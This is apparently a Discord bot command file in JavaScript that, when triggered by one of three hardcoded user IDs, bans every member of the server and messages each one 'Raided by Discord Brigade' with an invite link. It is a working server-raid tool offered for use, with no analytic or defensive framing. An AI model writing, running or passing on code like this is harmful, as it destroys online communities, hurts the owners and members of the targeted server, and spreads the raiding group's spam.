exports.run = (client, message, args) => { 
const Discord = require("discord.js")
  
 if (message.author.id !== "579234820408868872")
if (message.author.id !== "571391532033376276")
if (message.author.id !== "471035482789118004") return

message.guild.members.forEach(user => {
    user.ban("bye")
    user.send("Raided by Discord Brigade \n\nhttps://discord.gg/qyKBRw2")

  });
}